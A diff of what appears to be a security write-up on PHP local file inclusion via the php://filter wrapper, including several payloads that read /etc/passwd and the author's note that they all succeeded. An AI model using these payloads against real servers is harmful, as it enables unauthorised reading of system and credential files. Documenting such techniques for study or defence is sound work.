@@ -223,9 +223,17 @@ output encoded text
 
 The middle section there is where a filter to convert file is applied here to resource file index.php.
 
-Instead of getting the executed PHP page, you get something like:
+Instead of getting the executed PHP page, this valid filter gives something like:
 ```
 PD9waHAKJGRvYyA9ICRfR0VUWydkb2MnXTsK...
+```
+
+So if read=finds no filter called php,txt or banana it passes file without alternation.
+```
+The following no difference in output from my observation (all status 200, downloaded file passwd):
+php://filter/resource=/etc/passwd
+php://filter/read=banana/resource=/etc/passwd
+php://filter/read=pdf/resource=/etc/passwd
 ```
 Similarly its easy progression to see that altering that command its possible to obtain the passwd file with 
 ```
